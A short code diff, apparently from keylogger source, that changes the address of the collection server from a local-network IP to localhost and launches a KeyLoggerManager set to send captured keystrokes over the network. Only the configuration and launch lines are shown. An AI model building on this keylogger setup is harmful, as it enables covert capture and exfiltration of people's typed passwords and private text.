@@ -99,5 +99,5 @@ class KeyLoggerManager:
 
 
 
-server_link = "http://192.168.11.42:5000"
+server_link = "http://127.0.0.1:5000"
 KeyLoggerManager(server_link, if_screenshot=False, file_write=False, network_write=True).main()
